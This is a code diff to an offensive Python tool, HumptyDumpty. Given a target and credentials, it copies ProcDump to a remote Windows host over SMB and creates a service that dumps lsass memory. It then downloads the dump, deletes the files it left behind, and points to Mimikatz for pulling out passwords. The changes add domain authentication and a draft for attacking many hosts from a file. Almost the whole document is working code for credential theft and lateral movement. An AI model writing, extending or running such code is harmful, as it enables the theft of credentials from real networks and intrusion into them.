@@ -15,21 +15,45 @@ parser = argparse.ArgumentParser(description="Dump lsass on remote machines for 
 parser.add_argument("--target", "-t", help="Set the target", dest="target")
 parser.add_argument("--username", "-u", help="Set the target username", dest="username")
 parser.add_argument("--password", "-p", help="Set the target password", dest="password")
-parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain", default="") #needs work
+parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain", default=".")
+parser.add_argument("--file", "-f", help="Load ips/hostnames from file", dest="loadFromFile")# work in progress
 parser.add_argument("--output", "-o", help="Destination directory, default is current dir. Example: /dest/dir/", dest="output", default="")
 parser.add_argument("--version", action="version", version="0.1")
 args = parser.parse_args()
 
+''''
+------------WORK IN PRGRESS (LOAD FROM FILE)--------------
+if args.loadFromFile is None:
+    #upload procdump
+    print (colored("\n[-] Sending ProcDump over SMB...", "yellow"))
+    subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username,"-W"+args.domain,args.password,"-c put procdump.exe"])
+    print (colored("[+] Done", "green"))
+else:
+    fileName = open(args.loadFromFile, 'r')
+    for ip in fileName.readlines():
+        try:
+            print (ip)
+            subprocess.call(["smbclient","//"+ip+"/c$","-U"+args.username,"-W"+args.domain,args.password,"-c put procdump.exe"])
+            pass
+        except:
+            print ("fail")
+------------WORK IN PRGRESS (LOAD FROM FILE)--------------
+'''
+### START ###
 print (colored("\nHumptyDumpty by }==[n33dle]>----", "white"))
 
 #upload procdump
 print (colored("\n[-] Sending ProcDump over SMB...", "yellow"))
-subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c put procdump.exe"])
+subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username,"-W"+args.domain,args.password,"-c put procdump.exe"])
 print (colored("[+] Done", "green"))
 
 #Dump creds
 print (colored("[-] Dumping lsass to file (executing procdump)...", "yellow"))
-c = Client(args.target, username=args.username, password=args.password, encrypt=False)
+#hate this, want to do without if statement
+if args.domain is ".":
+	c = Client(args.target, username=args.username, password=args.password, encrypt=False)
+else:
+	c = Client(args.target, username=args.username+"@"+args.domain, password=args.password, encrypt=False)
 c.connect()
 try:
  c.create_service()
@@ -40,7 +64,7 @@ print (colored("[+] Done", "green"))
 
 #Download dump and cleanup
 print (colored("[-] Downloading the lsass dumpfile and cleaning up...", "yellow"))
-subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get humpty-"+args.target+".dmp "+args.output+"humpty-"+args.target+".dmp;del humpty-"+args.target+".dmp;del procdump.exe"])
+subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username,"-W"+args.domain,args.password,"-c get humpty-"+args.target+".dmp "+args.output+"humpty-"+args.target+".dmp;del humpty-"+args.target+".dmp;del procdump.exe"])
 
 ### FINISH ###
 print (colored("[+] Done - saved as: "+args.output+"humpty-"+args.target+".dmp", "green"))
@@ -51,10 +75,7 @@ print (colored("Mimikatz# sekurlsa::logonPasswords full", "blue"))
 
 '''
 To do:
-- Set default as local auth and override with domain auth when -d selected
 - Allow target to be single IP or list of IPs from a file
 - Better error handling
 - Automate mimikatz at the end, or prompt to run mimikatz or end script
-This is a test
 '''
-
